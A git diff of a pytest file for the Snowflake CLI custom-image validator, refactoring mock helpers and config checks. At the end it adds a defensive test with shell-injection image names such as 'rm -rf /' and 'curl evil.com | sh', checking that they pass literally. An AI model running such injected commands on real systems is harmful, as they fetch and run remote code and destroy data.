@@ -13,6 +13,7 @@
 # limitations under the License.
 
 import json
+import subprocess
 from pathlib import Path
 from unittest import mock
 
@@ -20,67 +21,11 @@ import pytest
 from click import ClickException
 from snowflake.cli._plugins.custom_images.manager import CustomImageManager
 
-
-def make_docker_inspect_response(
-    entrypoint: list[str] | None = None,
-    env_vars: list[str] | None = None,
-) -> str:
-    """Helper to create a mock docker inspect JSON response."""
-    return json.dumps(
-        [
-            {
-                "Config": {
-                    "Entrypoint": entrypoint,
-                    "Env": env_vars or [],
-                    "Labels": {},
-                }
-            }
-        ]
-    )
-
-
-def make_pip_list_response(packages: list[dict]) -> str:
-    """Helper to create a mock pip list JSON response."""
-    return json.dumps(packages)
-
-
-def create_mock_side_effect(
-    inspect_response: str | None = None,
-    pip_list_response: str | None = None,
-    pip_check_result: tuple[int, str] = (0, ""),
-    grype_result: tuple[int, str] = (0, ""),
-    grype_error: Exception | None = None,
-):
-    """Helper to create a mock side_effect function for subprocess.run."""
-    if inspect_response is None:
-        inspect_response = make_docker_inspect_response()
-    if pip_list_response is None:
-        pip_list_response = make_pip_list_response([])
-
-    def side_effect(*args, **kwargs):
-        cmd = args[0]
-        cmd_str = " ".join(cmd)
-        if cmd[0] == "docker":
-            if "inspect" in cmd:
-                return mock.Mock(returncode=0, stdout=inspect_response, stderr="")
-            elif "run" in cmd:
-                if "pip list" in cmd_str:
-                    return mock.Mock(returncode=0, stdout=pip_list_response, stderr="")
-                elif "pip check" in cmd_str:
-                    return mock.Mock(
-                        returncode=pip_check_result[0],
-                        stdout=pip_check_result[1],
-                        stderr="",
-                    )
-        elif cmd[0] == "grype":
-            if grype_error:
-                raise grype_error
-            return mock.Mock(
-                returncode=grype_result[0], stdout=grype_result[1], stderr=""
-            )
-        return mock.Mock(returncode=0, stdout="", stderr="")
-
-    return side_effect
+from tests.custom_images.test_helpers import (
+    create_mock_side_effect,
+    make_docker_inspect_response,
+    make_pip_list_response,
+)
 
 
 class TestCustomImageManager:
@@ -100,8 +45,10 @@ checks:
   python_packages:
     - snowflake-ml-python
     - ray
-  dependency_health: true
-  vulnerability_scan: true
+  dependency_health:
+    enabled: true
+    ignore_patterns:
+      - jupyter-lsp
 """
         config_file = tmp_path / "test_config.yaml"
         config_file.write_text(config_content)
@@ -182,6 +129,26 @@ checks:
                 ["/usr/local/bin/entrypoint.sh"],
                 ["DASHBOARD_PORT=12003"],
                 [{"name": "snowflake-ml-python", "version": "1.0"}],
+                False,
+            ),
+            # Entrypoint is None (no entrypoint configured) - should fail
+            (
+                None,
+                ["DASHBOARD_PORT=12003"],
+                [
+                    {"name": "snowflake-ml-python", "version": "1.0"},
+                    {"name": "ray", "version": "2.0"},
+                ],
+                False,
+            ),
+            # Entrypoint is empty list - should fail
+            (
+                [],
+                ["DASHBOARD_PORT=12003"],
+                [
+                    {"name": "snowflake-ml-python", "version": "1.0"},
+                    {"name": "ray", "version": "2.0"},
+                ],
                 False,
             ),
         ],
@@ -266,7 +233,6 @@ def test_vulnerability_scan_failure_shows_table(mock_run, tmp_path):
 version: "1.0"
 checks:
   entrypoint: "/usr/local/bin/entrypoint.sh"
-  vulnerability_scan: true
 """
     )
     grype_out = json.dumps(
@@ -299,21 +265,12 @@ checks:
         }
     )
 
-    def side_effect(*args, **kwargs):
-        cmd = args[0]
-        if cmd[0] == "docker" and "inspect" in cmd:
-            return mock.Mock(
-                returncode=0,
-                stdout=make_docker_inspect_response(
-                    entrypoint=["/usr/local/bin/entrypoint.sh"]
-                ),
-                stderr="",
-            )
-        if cmd[0] == "grype":
-            return mock.Mock(returncode=1, stdout=grype_out, stderr="")
-        return mock.Mock(returncode=0, stdout="", stderr="")
-
-    mock_run.side_effect = side_effect
+    mock_run.side_effect = create_mock_side_effect(
+        inspect_response=make_docker_inspect_response(
+            entrypoint=["/usr/local/bin/entrypoint.sh"]
+        ),
+        grype_result=(1, grype_out),
+    )
     manager = CustomImageManager(config_path=config_file)
     report, _ = manager.validate("img:latest", scan_vulnerabilities=True)
     vuln = next(r for r in report.results if r.check_name == "vulnerability_scan")
@@ -326,3 +283,26 @@ checks:
     assert "curl" in vuln.message and "Critical" in vuln.message
     assert "skip-me" not in vuln.message
     assert '"matches"' not in vuln.message
+
+
+@pytest.mark.parametrize(
+    "malicious_name",
+    [
+        "legit; rm -rf /",
+        "img:latest && curl evil.com | sh",
+        "$(whoami)",
+        "img`id`",
+        'img" --some-flag',
+    ],
+)
+def test_subprocess_list_passes_malicious_name_literally(malicious_name):
+    """Shell metacharacters in image names are passed literally, not interpreted."""
+    import sys
+
+    result = subprocess.run(
+        [sys.executable, "-c", "import sys; print(sys.argv[1])", malicious_name],
+        capture_output=True,
+        text=True,
+    )
+    assert result.returncode == 0
+    assert result.stdout.strip() == malicious_name
